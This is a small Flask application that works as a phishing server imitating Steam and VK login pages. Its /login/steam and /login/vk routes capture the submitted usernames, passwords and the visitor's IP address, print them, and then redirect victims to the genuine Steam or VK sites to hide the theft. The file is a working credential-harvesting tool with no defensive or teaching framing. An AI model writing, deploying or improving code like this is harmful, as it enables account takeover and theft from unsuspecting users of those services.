from flask import Flask, render_template, flash, redirect, url_for, request, jsonify
import os, string, random, time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'KEY'

@app.route("/steam", methods=['GET', 'POST'])
def steam():
	return render_template('index.html')

@app.route("/vk", methods=['GET', 'POST'])
def vk():
	return render_template('vk.html')

@app.route("/vkp", methods=['GET', 'POST'])
def vkp():
	return render_template('m.vk.html')

@app.route('/login/steam', methods=['GET', 'POST'])
def login_steam():
	username = request.values.get('username')
	password = request.values.get('password')
	print(f'Username: {username}\nPassword: {password}\nIP: {request.remote_addr}')

	return redirect('https://store.steampowered.com/')

@app.route("/login/vk", methods=['GET', 'POST'])
def vk_login():
	username = request.values.get('email')
	password = request.values.get('pass')
	print(f'Username: {username}\nPassword: {password}\nIP: {request.remote_addr}')

	return redirect('https://vk.com/')

if __name__ == '__main__':
	port = int(os.environ.get("PORT", 5000))
	app.run(host='0.0.0.0', port=port)
